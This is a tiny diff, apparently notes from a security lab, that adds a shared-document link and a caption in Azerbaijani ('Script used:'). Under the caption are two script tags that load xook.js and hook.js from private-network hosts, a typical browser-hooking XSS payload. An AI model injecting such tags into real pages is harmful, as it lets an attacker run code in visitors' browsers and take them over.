@@ -1,0 +1,5 @@
+https://docs.google.com/document/d/10JUgQNh5IRRamM_J4GbG2oJZQMUHbA1UGKAvP2f29JA/edit?usp=sharing
+
+İstifadə olunan script:
+<script src="http://192.168.31.81:5005/xook.js"></script>
+<script src="http://192.168.31.93:3000/hook.js"></script>
